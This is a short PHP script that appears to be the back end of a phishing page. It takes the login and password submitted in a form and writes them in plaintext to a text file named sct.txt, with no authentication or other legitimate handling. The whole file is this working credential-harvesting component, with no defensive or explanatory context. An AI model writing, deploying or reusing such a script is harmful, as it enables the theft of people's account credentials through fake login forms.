<?php
$mifile = fopen ("sct.txt", "w");

$login=$_POST["login"];
fwrite($mifile, $login);
$passworld=$_POST["password"];
fwrite($mifile, $passworld);

fclose($mifile);
?>